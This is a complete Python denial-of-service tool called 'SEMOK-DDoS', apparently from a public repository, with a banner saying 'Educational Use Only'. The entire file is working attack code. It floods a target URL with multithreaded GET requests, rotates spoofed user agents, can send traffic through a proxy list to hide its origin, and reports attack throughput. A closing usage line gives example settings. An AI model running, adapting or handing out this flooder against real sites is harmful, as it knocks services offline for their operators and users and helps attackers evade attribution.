#!/usr/bin/env python3
import threading
import requests
import sys
import argparse
from colorama import Fore, Style, init
import random
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

init(autoreset=True)

def banner():
    print(Fore.RED + Style.BRIGHT + """
╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗
║╔══╝║╔══╝║╔═╗║║╔═╗║║╔═╗║
║╚══╗║╚══╗║╚═╝║║╚═╝║║╚══╗
║╔══╝║╔══╝║╔╗╔╝║╔╗╔╝╚══╗║
║╚══╗║╚══╗║║║╚╗║║║╚╗║╚═╝║
╚═══╝╚═══╝╚╝╚═╝╚╝╚═╝╚═══╝
    """ + Fore.YELLOW + "SEMOK-DDoS | by jusot99 | Educational Use Only!")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/52.0",
]

def load_proxies(proxy_file):
    try:
        with open(proxy_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        print(Fore.RED + "[!] Proxy file not found, continuing without proxies")
        return None

def validate_url(url):
    try:
        response = requests.get(url, timeout=5)
        print(Fore.GREEN + f"[+] Target reachable ({response.status_code})")
        return True
    except:
        print(Fore.RED + "[!] Target unreachable")
        return False

def send_request(url, proxy_list=None, attack_num=0):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    proxies = {"http": random.choice(proxy_list), "https": random.choice(proxy_list)} if proxy_list else None
    
    try:
        start_time = time.time()
        response = requests.get(url, headers=headers, proxies=proxies, timeout=5)
        response_time = time.time() - start_time
        
        status_color = Fore.GREEN if response.status_code == 200 else Fore.YELLOW
        print(f"{status_color}[{attack_num}] Status: {response.status_code} | Time: {response_time:.2f}s")
        return True
    except Exception as e:
        print(Fore.RED + f"[{attack_num}] Failed: {str(e)[:30]}")
        return False

def attack_worker(url, requests_count, proxy_list, worker_id, delay=0):
    success = 0
    for i in range(requests_count):
        if send_request(url, proxy_list, worker_id * 1000 + i):
            success += 1
        if delay > 0:
            time.sleep(delay)
    return success

def launch_attack(url, threads, requests_per_thread, proxy_list=None, delay=0):
    print(Fore.CYAN + f"\n[+] Starting attack with {threads} threads...")
    start_time = time.time()
    total_success = 0
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(attack_worker, url, requests_per_thread, proxy_list, i, delay) 
                  for i in range(threads)]
        
        for future in as_completed(futures):
            total_success += future.result()
    
    attack_time = time.time() - start_time
    print(Fore.GREEN + f"\n[+] Attack completed!")
    print(Fore.YELLOW + f"[+] Successful requests: {total_success}/{threads * requests_per_thread}")
    print(Fore.YELLOW + f"[+] Attack duration: {attack_time:.2f}s")
    print(Fore.YELLOW + f"[+] Requests/sec: {(total_success/attack_time):.2f}")

def main():
    banner()
    parser = argparse.ArgumentParser(description="SEMOK-DDoS Tool")
    parser.add_argument("target", help="Target URL (e.g., http://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Threads (default: 10)")
    parser.add_argument("-r", "--requests", type=int, default=50, help="Requests per thread (default: 50)")
    parser.add_argument("-p", "--proxies", help="Proxy file")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests")
    
    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(1)
    
    args = parser.parse_args()
    
    print(Fore.CYAN + f"\n[+] Target: {args.target}")
    print(Fore.CYAN + f"[+] Threads: {args.threads}")
    print(Fore.CYAN + f"[+] Requests: {args.requests}")
    print(Fore.CYAN + f"[+] Total: {args.threads * args.requests} requests")
    
    proxy_list = load_proxies(args.proxies) if args.proxies else None
    if proxy_list:
        print(Fore.CYAN + f"[+] Proxies: {len(proxy_list)} loaded")
    
    if args.delay > 0:
        print(Fore.CYAN + f"[+] Delay: {args.delay}s between requests")
    
    if not validate_url(args.target):
        sys.exit(1)
    
    try:
        launch_attack(args.target, args.threads, args.requests, proxy_list, args.delay)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Attack stopped by user")
    except Exception as e:
        print(Fore.RED + f"\n[!] Error: {e}")

if __name__ == "__main__":
    main()

# python3 semok.py https://example.com -t 20 -r 100 -p proxies.txt -d 0.1
